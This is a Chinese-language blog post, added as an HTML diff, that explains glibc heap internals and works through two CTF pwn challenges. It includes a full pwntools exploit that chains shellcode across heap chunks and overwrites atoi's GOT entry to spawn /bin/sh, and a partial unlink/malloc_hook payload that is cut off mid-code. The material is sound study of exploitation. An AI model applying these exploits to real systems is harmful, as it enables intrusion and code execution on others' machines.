@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="堆笔记heap-related:*use-after-frees, double-frees,*and heap-overflows 应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当">
+<meta property="og:type" content="article">
+<meta property="og:title" content="YUSHUSU">
+<meta property="og:url" content="http://yushusu.github.io/2023/07/08/heapnote/">
+<meta property="og:site_name" content="YUSHUSU">
+<meta property="og:description" content="堆笔记heap-related:*use-after-frees, double-frees,*and heap-overflows 应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled1.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled2.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled3.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled4.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled5.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled6.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled7.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled8.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled9.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled10.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled11.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled12.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled13.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled14.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled15.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled16.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled17.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled18.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled19.png">
+<meta property="og:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled20.png">
+<meta property="article:published_time" content="2023-07-08T01:06:26.000Z">
+<meta property="article:modified_time" content="2023-07-08T09:12:08.547Z">
+<meta property="article:author" content="yushusu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yushusu.github.io/2023/07/08/heapnote/Untitled.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>YUSHUSU</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/29/CVE-2014-7911-Android-5-0-Privilege-Escalation-using-ObjectInputStream/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yushusu.github.io/2023/07/08/heapnote/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yushusu.github.io/2023/07/08/heapnote/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yushusu.github.io/2023/07/08/heapnote/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yushusu.github.io/2023/07/08/heapnote/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yushusu.github.io/2023/07/08/heapnote/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yushusu.github.io/2023/07/08/heapnote/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">堆笔记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-note-service2-UAF"><span class="toc-number">2.</span> <span class="toc-text">例题：**note_service2(**UAF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Anoleak%EF%BC%88mallochook-UAF%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">例题：noleak（mallochook+UAF）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%9Abin"><span class="toc-number">3.1.</span> <span class="toc-text">堆管理机制：bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%9Achunk"><span class="toc-number">3.2.</span> <span class="toc-text">堆管理机制：chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%9Aptmalloc%E7%AE%97%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">堆管理机制：ptmalloc算法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink%E6%9C%BA%E5%88%B6%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">Unlink机制：</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yushusu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-08T01:06:26.000Z" class="dt-published" itemprop="datePublished">2023-07-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="堆笔记"><a href="#堆笔记" class="headerlink" title="堆笔记"></a>堆笔记</h1><p>heap-related:*use-after-frees, double-frees,*and <em>heap-overflows</em></p>
+<p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。</p>
+<p>如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p>
+<blockquote>
+<p>小内存： [获取分配区(arena)并加锁] -&gt; fast bin -&gt; unsorted bin -&gt; small bin -&gt; large bin -&gt; top chunk -&gt; 扩展堆大内存： 直接mmap</p>
+</blockquote>
+<p>使用<code>malloc</code>申请内存超过<code>MMAP_THRESHOLD</code>时就会调用<code>mmap</code>申请内存</p>
+<blockquote>
+<p>Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). MMAP_THRESHOLD is 128 kB by default, but is adjustable using mallopt(3). Allocations performed using mmap(2) are unaffected by the RLIMIT_DATA resource limit (see getrlimit(2)).</p>
+</blockquote>
+<p>申请到的<code>chunk</code>地址在<code>libc</code>和<code>ld</code>附近</p>
+<p>这是比较常见的利用点</p>
+<p>如果chunk中存在溢出或者越界读写漏洞的话，可以泄漏或修改libc或者ld中的值</p>
+<p>简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p>
+<p>管理堆的双向链表链表结构如下：</p>
+<img src="/2023/07/08/heapnote/Untitled.png" class title="Untitled">
+
+<p>memory被free后，heap manager还是会记录这些freed块在一个链表‘bin’里，这样再申请时会在这里面找（this is how point 1 do），找到之后标记‘allocated’并返回指向‘user data’的块指针。</p>
+<p>bins:fast bins, the unsorted bin, small bins, large bins, and the per-thread tcache</p>
+<img src="/2023/07/08/heapnote/Untitled1.png" class title="Untitled">
+
+<p>Arenas:</p>
+<p>堆管理器用全局互斥锁（mutex）来维护一个内部堆结构来避免程序崩溃，就是保证每次只有一个线程与堆互动。this is how arenas comes</p>
+<p>每个arenas独立维护自己的chunk allocation和free bins.</p>
+<p>当进程创建新线程时，堆管理器会为每个新线程分配secondary arenas，以减少线程在执行malloc和free操作时必须等待。</p>
+<p>我们知道主堆区在程序加载进内存的后面且用brk system call扩展，但secondary arenas不能如此，</p>
+<p>secondary arenas模拟main heap的行为，使用一个或者多个<a target="_blank" rel="noopener" href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452">subheaps</a>来创建（using mmap and mprotect）。</p>
+<p>subheaps:</p>
+<p>初始化堆（main arena）用sbrk动态扩展，而子堆使用mmap定位到内存中，堆管理器用mprotect手动模拟子堆增长。</p>
+<img src="/2023/07/08/heapnote/Untitled2.png" class title="Untitled">
+
+<p>堆分配的chunk结构如下：</p>
+<img src="/2023/07/08/heapnote/Untitled3.png" class title="Untitled">
+
+<p><strong>small chunks 分配规则：</strong></p>
+<p>1.如果有刚free的chunk（存在bin里），且满足申请的大小，那么就用这个。</p>
+<p>2.不行的话，如果heap顶有可用空间，就从中取之。</p>
+<p>3.再不行的话，向kernel申请内存 (using sbrk()) 到heap底（end of heap），在这块新空间中取之。</p>
+<p>4.再不行就error返回NULL。</p>
+<p>chunk metadata:chunk的结构</p>
+<img src="/2023/07/08/heapnote/Untitled4.png" class title="Untitled">
+
+<p><code>mchunk_size</code> 存储4样东西 ：this chunk size +’A’’M’’P’，分别存储在同样的size_t里，因为这些chunk sizes一般是8byte对齐（16byte对齐on64bit）,因此最后3bits的chunk size总是为0 </p>
+<p>“A”：用于告诉堆管理器该块是否属于secondary arena(subheap)，而不是main arena。在 free时，堆管理器只得到一个指向程序员想要释放的分配的指针，堆管理器需要计算出该指针属于哪个领域。如果在块的元数据中设置了 A 标志，堆管理器必须搜索每个区域并查看指针是否位于该区域的任何子堆(subheap)中。如果未设置该标志，堆管理器可以缩短搜索，因为它知道块来自初始堆（initial arena&#x2F;main arena）。</p>
+<p>“M”：标志用于指示该块是通过 mmap 在堆外分配的巨大分配。当这个分配最终被传递回 free 时，堆管理器将立即通过 munmap 将整个块返回给操作系统，而不是尝试回收它。出于这个原因，释放的块永远不会设置这个标志。</p>
+<p>“P”：它表示前一个块是空闲块。这意味着当这个块被释放时，它可以安全地连接到前一个块上以创建一个更大的空闲块。</p>
+<img src="/2023/07/08/heapnote/Untitled5.png" class title="Untitled">
+
+<p>Glibc heap:</p>
+<p>free在操作指向chunk块的删减时候，会进行一系列检查来确保改块chunk是没在使用的：</p>
+<ul>
+<li>检查对齐：8byte on 32,16byte on 64</li>
+<li>检查该块的大小字段是否不可能–要么是太小，要么是太大，要么不是对齐的大小，要么是会与进程的地址空间的末端重叠</li>
+<li>检查大块位于arena的边界之内</li>
+<li>通过检查位于下一个块开始的元数据中的相应的 “P “位，检查该块是否已经被标记为free</li>
+</ul>
+<p><strong>FREE CHUNK METADATA:</strong></p>
+<img src="/2023/07/08/heapnote/Untitled6.png" class title="Untitled">
+
+<p>free掉的块也会存储这些边界信息来保证空闲块也能很快的凝聚在一起</p>
+<h1 id="例题：-note-service2-UAF"><a href="#例题：-note-service2-UAF" class="headerlink" title="例题：**note_service2(**UAF)"></a>例题：**note_service2(**UAF)</h1><img src="/2023/07/08/heapnote/Untitled7.png" class title="Untitled">
+
+<p>**step1:**我们把shellcode分开，存储到多个堆里，然后在每个堆的最后2字节空间，填上jmp short xxxx指令，让它跳转到下一个堆里去执行代码。</p>
+<blockquote>
+<p>其中jmp short xxx中的xxx计算公式</p>
+<p>xxx &#x3D; 目标地址-当前地址-2</p>
+</blockquote>
+<p><strong>step2：</strong>创建堆的时候是按顺序创建下来的，并且期间没有进行删除操作，我们的堆统一为8字节(根据64位堆的数据结构，至少保证有prev_size、size、fd、bk的空间，实际上的大小为8 align to 32 &#x3D; 32字节)，并且，使用中的堆块的fd和bk被当成数据区，因此我们的数据是从这里开始的，导致后面还有0x8字节空数据。</p>
+<img src="/2023/07/08/heapnote/Untitled8.png" class title="Untitled">
+
+<p>从chunk0的jmp出跳到chunk1的data处xxxx执行新代码，那么我们jmp short后面的偏移为</p>
+<p>next &#x3D; (2+1+8 + 8 + 8  - 2) &#x3D; 25&#x3D;0x19</p>
+<blockquote>
+<p>注意那个末尾的1字节0，是输入函数给我们加上的，我们真正只能使用data区的7个字节，也就是我们的每个块里最多放7个字节的指令</p>
+</blockquote>
+<p>**step3:**构造shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codex=(asm(&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;+&#x27;\x90\x90\xeb\x19&#x27;)#明显超范围了</span><br><span class="line">code0=(asm(&#x27;xor rax,rax&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)#左填充“\x90”保证7字节（右对齐）</span><br><span class="line">code1=(asm(&#x27;mov eax,0x3b&#x27;)+&#x27;\xeb\x19&#x27;)</span><br><span class="line">code2=(asm(&#x27;xor rsi,rsi&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)</span><br><span class="line">code3=(asm(&#x27;xor rdx,rdx&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)</span><br><span class="line">code4=(asm(&#x27;syscall&#x27;).ljust(7,&#x27;\x90&#x27;))#用ljust进行右填充（左对齐）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>关键是rdi的值，在这里，如果我们将atoi的got表内容指向我们的第一个堆空间,那么当我们下一次输入选项时，我们输入&#x2F;bin&#x2F;sh就可以运行shellcode</p>
+<img src="/2023/07/08/heapnote/Untitled9.png" class title="Untitled">
+
+<p>**step4:**把任意的地方的8字节数据写成新建的堆的地址指针，通过数组越界也就是事先创建第一个堆用来占用那个空间，最后的时候delete掉后再申请回来(fastbin特性)，我们可以把一些函数的GOT表内容修改为堆指针，由于程序NX保护是关闭的，那么堆栈里的数据也可以当成指令执行。那么我们在堆里布置shellcode即可。</p>
+<img src="/2023/07/08/heapnote/Untitled10.png" class title="Untitled">
+
+<img src="/2023/07/08/heapnote/Untitled11.png" class title="Untitled">
+
+<p>偏移为0x40&#x2F;8 &#x3D; 8字节，也就是说,数组下标-8处就是atoi的GOT表</p>
+<blockquote>
+<p>分析代码可知“atoi”的参数是“read”读取来的，此处读入“&#x2F;bin&#x2F;sh”就可以代替codex了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53787</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,code0)</span><br><span class="line">malloc(<span class="number">1</span>,code1)</span><br><span class="line">malloc(<span class="number">2</span>,code2)</span><br><span class="line">malloc(<span class="number">3</span>,code3)</span><br><span class="line">malloc(<span class="number">4</span>,code4)</span><br><span class="line"><span class="comment">#删除第一个堆块</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)</span></span><br><span class="line"><span class="comment">#即修改了atoi的GOT表为我们的code0,下次调用atoi时调用的是指向code0的指针</span></span><br><span class="line">malloc(-<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="例题：noleak（mallochook-UAF）"><a href="#例题：noleak（mallochook-UAF）" class="headerlink" title="例题：noleak（mallochook+UAF）"></a>例题：noleak（mallochook+UAF）</h1><p>由于没开PIE，bss段可以随便使用</p>
+<p>RELRO是完全开启的，不能通过修改GOT表来进行攻击</p>
+<p>讲堆的<a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/refs/heap/">https://paper.seebug.org/papers/Archive/refs/heap/</a></p>
+<h2 id="堆管理机制：bin"><a href="#堆管理机制：bin" class="headerlink" title="堆管理机制：bin"></a><strong>堆管理机制：bin</strong></h2><p>一个链表被称为一个bin，简单来说bin就是<strong>free chunk的容器</strong></p>
+<p><strong>unsorted bin</strong>是一段特殊的bin，由free chunks组成的循环双链表，当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到<strong>unsorted bin</strong>中</p>
+<h2 id="堆管理机制：chunk"><a href="#堆管理机制：chunk" class="headerlink" title="堆管理机制：chunk"></a><strong>堆管理机制：chunk</strong></h2><p><strong>1.allocated chunk</strong>：当前chunk是被应用层用户所使用的</p>
+<p><strong>2.free chunk</strong>：当前chunk是空闲的，没有被应用层用户所使用</p>
+<p><strong>3.top chunk</strong>：当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</p>
+<p>该chunk并<strong>不属于任何bin</strong>，而是在系统当前的<strong>所有free chunk</strong>(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用</p>
+<p><strong>4.last remainter chunk</strong>：如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong></p>
+<h2 id="堆管理机制：ptmalloc算法"><a href="#堆管理机制：ptmalloc算法" class="headerlink" title="堆管理机制：ptmalloc算法"></a><strong>堆管理机制：ptmalloc算法</strong></h2><img src="/2023/07/08/heapnote/Untitled12.png" class title="Untitled">
+
+<p>每个arena理的chunks只有两种状态：in used or free.这些chunk放在bin上，分为fastbin、sort、large、small.</p>
+<p>malloc_hook机制是通过重新指定内存管理的回调函数指针来实现自定义的内存管理方式，在调用对应的malloc等函数的时候，将会被自动调用到自定义的函数,malloc机制中的unsorted bin、small bins以及large bins中的双向链表中的<strong>第一个chunk以及最后一个chunk中的 fd\bk 字段，都指向了一个结构(类型为malloc_state，变量名称为arena)的固定偏移的位置</strong>，当free一个unsorted bin时，它的fd指针会指向libc中main_arena地址附近处。而在这个结构之上的固定偏移位置，则是 __malloc_hook 的地址(其值被默认设置为null).</p>
+<img src="/2023/07/08/heapnote/Untitled13.png" class title="Untitled">
+
+<img src="/2023/07/08/heapnote/Untitled14.png" class title="Untitled">
+
+<h2 id="Unlink机制："><a href="#Unlink机制：" class="headerlink" title="Unlink机制："></a><strong>Unlink机制：</strong></h2><p>为了把指针移动到要操作的地址附近</p>
+<p>假如我们有一个这样的堆</p>
+<p>Chunk0(空闲)</p>
+<p>Prevsize&#x3D;0   size&#x3D;0x101</p>
+<p>Fd &#x3D;0x6020C8  BK &#x3D;0x6020D0</p>
+<p>DATA&#x3D;XXXXXXXXXXXXXXXXXXXX</p>
+<p>Chunk1(使用中)</p>
+<p>Prevsize&#x3D;0x100 size&#x3D;0x100</p>
+<p>DATA&#x3D;xxxxxxxxxxxxxxxxxxxx</p>
+<p>那么，当我们释放chunk1的时候,会与chunk0发生unlink</p>
+<p>首先，内存管理程序检查chunk1的size&#x3D;0x100，即最后的一个bit为0，说明前一个chunk处于空闲状态，那么，它会与前一个块发生合并，即从unsorted bin双向链表里删除前一个块，然后与自己合并后再加入unsorted bin。</p>
+<p>那么会调用unlink(prev_chunk(chunk1),NULL,NULL)在unlink函数中</p>
+<p>P &#x3D; chunk0</p>
+<p>FD&#x3D;chunk0-&gt;fd &#x3D; 0x6020C8</p>
+<p>BK&#x3D;chunk0-&gt;bk &#x3D; 0x6020D0</p>
+<p><strong>即数组的第1个元素被我们改成了0x6020C8，也就是相当于堆0指向了0x6020C8</strong></p>
+<p><strong>那么，我们编辑堆0也就是在编辑0x6020C8处，而此处的下方就是保存堆指针的数组，那么就可以构造payload来修改这个数组，这就是原理</strong></p>
+<p>目的：通过malloc_hook来执行shellcode,只要把 malloc_hook 赋值为shellcode的首地址，那么在执行malloc后就可以执行shellcode了,而地址随机化的堆空间并不适合写入shellcode，要选择一片<strong>可写入的</strong>，<strong>较稳定的</strong>内存段（比如bss段），利用<strong>堆溢出</strong>修改<strong>chunk的结构</strong>，通过<strong>unlink</strong>修改buf数组中指针指向的位置（使其指向bss段），利用update()把shellcode写入bss段，然后再利用undate()修改malloc_hook为bss段上shellcode的地址，最后执行 shellcode.</p>
+<p>步骤如下：</p>
+<blockquote>
+<p>In 64-bit, all the chunk data takes up <code>0x8</code> bytes each, so the offsets for <code>fd</code> and <code>bk</code> will be <code>0x10</code> and <code>0x18</code> respectively.</p>
+</blockquote>
+<p>step1:在堆上创建两个chunk（0x90），伪造堆结构如下，delete()删掉chunk1触发unlink操作</p>
+<img src="/2023/07/08/heapnote/Untitled15.png" class title="Untitled">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pre_size, size</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)<span class="comment">#最后一位为1（伪造P位）</span></span><br><span class="line"><span class="comment"># fd, bk</span></span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) + p64(buf - <span class="number">0x10</span>)<span class="comment">#伪造unlink的执行条件</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line"><span class="comment"># change chunk1 size</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)<span 